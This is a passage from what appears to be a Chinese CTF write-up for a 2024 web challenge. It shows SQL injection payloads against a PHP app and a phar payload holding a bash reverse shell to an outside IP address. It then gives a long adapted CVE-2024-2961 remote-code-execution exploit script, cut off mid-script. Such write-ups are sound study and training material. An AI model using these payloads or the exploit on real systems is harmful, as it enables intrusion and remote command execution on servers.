punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sql.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ctfer"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ctfer"</span><span class="token punctuation">;</span><span class="token comment">// 创建连接</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检测连接</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"连接失败: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到check函数中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT filename from data where url = '<span class="token interpolation"><span class="token variable">$url</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以注入</p><p>爆字段：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//127.0.0.1/'union select group_concat(filename,'--',url) from data#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240827165222255.png" alt="image-20240827165222255"></p><p>读取权限</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> @<span class="token variable">@secure_file_priv</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240827171017825.png" alt="image-20240827171017825"></p><p>但是试了半天并不能写入shell</p><blockquote><p>hint：或许可以关注一下hash_file函数</p></blockquote><p>那么重新整理一下我们掌握的信息，我们可以控制写入文件路径的内容，而且可以知道对应文件路径的位置，但是文件的后缀固定为txt</p><p>我们知道<code>phar://</code>是无视后缀的，那么控制filename为<code>phar://xxx.txt</code>即可，在我们的vps上准备phar包</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php system("bash -c \'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1\'"); ?>'</span><span class="token punctuation">;</span> <span class="token comment">//一句话木马</span>@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'2.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"3.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exp.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$payload</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">// $phar->setMetadata(...); //在metadata添加内容，可参考 phar反序列化，此处用不着，故注释</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>让靶机curl，从而上传phar包</p><p>然后利用sql注入获取路径</p><p><img src="/blog/2024/08/27/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024/image-20240827205230975.png" alt="image-20240827205230975"></p><p>获取路径：<code>data/2024-08-27_zspCkaDq.txt</code></p><p>然后再构造sql注入文件名<code>phar://data/2024-08-27_zspCkaDq.txt/exp.php</code></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/'union select "phar://data/2024-08-27_zspCkaDq.txt/exp.php"#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是突然想起来php8后Phar中的元信息不再自动进行反序列化了，寄</p><h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p>后面想了想应该可以打CVE-2024-2961，我们需要手动获取 &#x2F;proc&#x2F;self&#x2F;maps 和 libc.so，然后生成 path 来打</p><p>流程是：</p><p>先读取 &#x2F;proc&#x2F;self&#x2F;maps</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">//localhost/proc/self/maps</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把读取到的内容dump下来<del>（懒得写py脚本匹配了）</del></p><p>然后爆改cve-2024-2961的脚本，先打印出 libc.path得到 libc 的路径，再把 libc.so.6 dump 下来，填进 LIBC_FILE ，然后再跑一次脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ChunkedEncodingError<span class="token punctuation">,</span> ConnectionError<span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"劄"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.        """</span>        <span class="token comment">#print(path)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"url"</span><span class="token punctuation">:</span> <span class="token string">"http://127.0.0.1/'union select\""</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">"\"#"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token comment">#print(response.text)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"File contents: (.*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>        <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        """</span>                <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result            text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>            text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>            text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>            msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"download_maps"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            maps <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">#maps = maps.decode()</span>        <span class="token comment">#print(maps)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token comment">#print(regions)</span>        <span class="token keyword">return</span> regions        <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>            LIBC_FILE <span class="token operator">=</span> <span class="token string">"dump_libc"</span> <span class="token comment"># 自行dump，建议用base64伪协议读取下来避免出现损坏</span>        <span class="token comment"># PHP's heap</span>            self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token comment"># Libc</span>            libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">)</span>            <span class="token comment">#self.download_file(libc.path, LIBC_FILE)</span>                self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start        <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> region        <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">""</span>        <span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>            first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token 